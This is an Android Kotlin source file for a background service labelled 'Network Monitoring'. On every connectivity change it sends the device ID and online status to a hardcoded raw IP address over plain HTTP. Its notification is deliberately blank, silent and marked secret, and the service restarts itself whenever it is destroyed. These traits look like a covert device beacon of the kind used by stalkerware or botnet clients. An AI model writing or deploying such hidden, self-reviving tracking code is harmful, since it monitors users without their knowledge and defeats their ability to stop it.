package com.example.test

import android.app.*
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class NetworkService : Service() {

    companion object {
        private const val TAG = "NetworkService"
        private const val NOTIFICATION_ID = 3
        private const val CHANNEL_ID = "network_monitoring_channel"
    }

    private lateinit var connectivityManager: ConnectivityManager
    private var isCallbackRegistered = false

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            Log.d(TAG, "✅ Network AVAILABLE")
            updateOnlineStatus(true)
        }

        override fun onLost(network: Network) {
            Log.d(TAG, "❌ Network LOST")
            updateOnlineStatus(false)
        }

        override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
            val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            val isValidated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)

            Log.d(TAG, "📶 Network capabilities - Internet: $hasInternet, Validated: $isValidated")

            if (hasInternet && isValidated) {
                updateOnlineStatus(true)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🚀 NetworkService created")

        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        // شروع Foreground Service
        startForegroundWithNotification()

        // ثبت NetworkCallback
        registerNetworkCallback()

        // ارسال وضعیت اولیه
        val isOnline = isNetworkAvailable()
        updateOnlineStatus(isOnline)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "📞 onStartCommand called")

        // اگه سرویس کشته شد، دوباره استارت بشه
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundWithNotification() {
        createNotificationChannel()

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "✅ Started as Foreground Service")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Network Monitoring",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Monitoring network status"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun registerNetworkCallback() {
        if (isCallbackRegistered) {
            Log.w(TAG, "⚠️ NetworkCallback already registered")
            return
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val networkRequest = NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                    .build()

                connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
                isCallbackRegistered = true
                Log.d(TAG, "✅ NetworkCallback registered")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to register NetworkCallback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        if (!isCallbackRegistered) return

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                connectivityManager.unregisterNetworkCallback(networkCallback)
                isCallbackRegistered = false
                Log.d(TAG, "👋 NetworkCallback unregistered")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to unregister NetworkCallback", e)
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } else {
            @Suppress("DEPRECATION")
            val netInfo = connectivityManager.activeNetworkInfo
            netInfo != null && netInfo.isConnected
        }
    }

    private fun updateOnlineStatus(isOnline: Boolean) {
        Thread {
            try {
                val deviceId = Settings.Secure.getString(
                    contentResolver,
                    Settings.Secure.ANDROID_ID
                )

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isOnline", isOnline)
                    put("timestamp", System.currentTimeMillis())
                }

                Log.d(TAG, "📤 Updating status: $isOnline")

                val url = URL("http://95.134.130.160:8765/devices/update-online-status")
                val conn = url.openConnection() as HttpURLConnection

                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                val responseCode = conn.responseCode
                if (responseCode in 200..201) {
                    Log.d(TAG, "✅ Status updated successfully")
                } else {
                    Log.w(TAG, "⚠️ Backend response: $responseCode")
                }

                conn.disconnect()

            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to update status", e)
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterNetworkCallback()
        Log.d(TAG, "👋 NetworkService destroyed")

        // اگه کشته شد، دوباره استارتش کن
        val restartIntent = Intent(applicationContext, NetworkService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(restartIntent)
        } else {
            applicationContext.startService(restartIntent)
        }
    }
}